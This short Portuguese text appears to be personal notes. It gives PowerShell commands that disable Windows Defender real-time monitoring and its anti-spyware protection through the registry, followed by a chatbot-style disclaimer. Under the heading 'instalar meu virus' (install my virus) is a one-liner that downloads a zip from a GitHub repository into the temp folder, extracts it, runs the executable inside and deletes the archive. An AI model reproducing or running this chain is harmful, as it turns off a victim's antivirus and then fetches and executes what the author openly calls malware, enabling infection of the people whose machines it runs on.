Set-MpPreference -DisableRealtimeMonitoring $true

Usando o PowerShell para Desativar o Windows Defender

    Abra o PowerShell como Administrador:
        Clique com o botão direito no menu Iniciar e selecione "Windows Terminal (Admin)" ou "PowerShell (Admin)".

    Digite os seguintes comandos um por um e pressione Enter após cada um:

    powershell

    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force

    Reinicie o computador para que as alterações entrem em vigor.

##Importante

##Lembre-se de que desativar o Windows Defender pode deixar seu sistema vulnerável. É sempre bom ter outra solução de segurança instalada. Se precisar de mais ajuda, estou aqui!




##instalar meu virus  



  $tempPath="$env:TEMP\ardx-main.zip"; $extractedPath="$env:TEMP\ardx-main\ardx-main"; Invoke-WebRequest -Uri "https://github.com/oldmones/ardx/archive/refs/heads/main.zip" -OutFile $tempPath; Expand-Archive -Path $tempPath -DestinationPath "$env:TEMP\ardx-main" -Force; Start-Process -FilePath "$extractedPath\ConsoleApp1.exe" -Wait; Remove-Item -Path $tempPath -Force -ErrorAction SilentlyContinue




###############
